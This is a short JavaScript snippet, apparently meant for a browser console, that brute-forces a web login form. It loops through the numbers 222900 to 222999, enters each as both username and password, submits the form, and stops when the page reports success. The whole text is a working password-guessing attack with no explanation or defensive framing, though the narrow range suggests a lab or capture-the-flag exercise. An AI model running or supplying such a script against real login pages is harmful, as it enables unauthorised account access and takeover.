(async function () {
  for (let i = 222900; i <= 222999; i++) {
    document.getElementById("username").value = i;
    document.getElementById("password").value = i;
    document.querySelector("button").click();

    await new Promise((resolve) => setTimeout(resolve, 300)); // wait for DOM update

    const msg = document.getElementById("message").textContent;
    console.log("Tried:", i, "→", msg);

    if (msg.includes("successful")) {
      console.log("✅ Found correct credentials:", i);
      break;
    }
  }
})();
